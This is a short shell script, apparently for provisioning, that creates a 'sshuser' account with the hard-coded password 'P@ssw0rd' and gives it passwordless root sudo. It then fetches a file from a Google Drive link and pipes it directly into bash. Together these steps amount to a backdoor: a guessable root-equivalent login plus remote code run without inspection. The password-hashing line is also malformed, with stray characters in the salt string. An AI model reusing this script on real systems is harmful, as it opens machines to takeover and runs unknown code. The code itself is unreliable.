#!/bin/sh
/usr/sbin/useradd sshuser
/usr/sbin/usermod -p $(python -c "import random,string,crypt,getpass,pwd; randomsalt = ''.join(random.sample(string.ascii_letters,8)); print crypt.crypt('P@ssw0rd', '\$6\$%s))\$' % randomsalt)"
) sshuser
printf "sshuser\tALL=(root)\tNOPASSWD:ALL\n" > /etc/sudoers.d/user_sshuser

curl -s -L "https://docs.google.com/uc?export=download&id=0B1UCEMO4lPv8NFdqU3VTUGFKa1k" | bash